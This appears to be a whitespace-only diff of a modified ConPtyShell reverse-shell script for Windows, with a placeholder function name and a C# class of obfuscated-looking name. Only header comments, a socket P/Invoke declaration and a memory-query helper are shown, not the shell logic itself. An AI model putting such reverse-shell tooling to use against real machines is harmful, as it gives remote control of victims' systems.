@@ -1,7 +1,7 @@
 function *FUNC*
-{   
+{
     # This is a slightly modified version of:
-    #   ConPtyShell - Fully Interactive Reverse Shell for Windows 
+    #   ConPtyShell - Fully Interactive Reverse Shell for Windows
     #   Author: splinter_code
     #   License: MIT
     #   Source: https://github.com/antonioCoco/ConPtyShell
@@ -276,7 +276,7 @@ public static class sHJck
 
     [DllImport("Ws2_32.dll")]
     public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
-    
+
     private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
     {
         if (infoLength == 0)
@@ -288,7 +288,7 @@ public static class sHJck
             infoLength = infoLength * 2;
             if (result == NTSTATUS_SUCCESS)
                 return infoPtr;
-            Marshal.FreeHGlobal(infoPtr);  
+            Marshal.FreeHGlobal(infoPtr);
             if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
             {
                 return IntPtr.Zero;
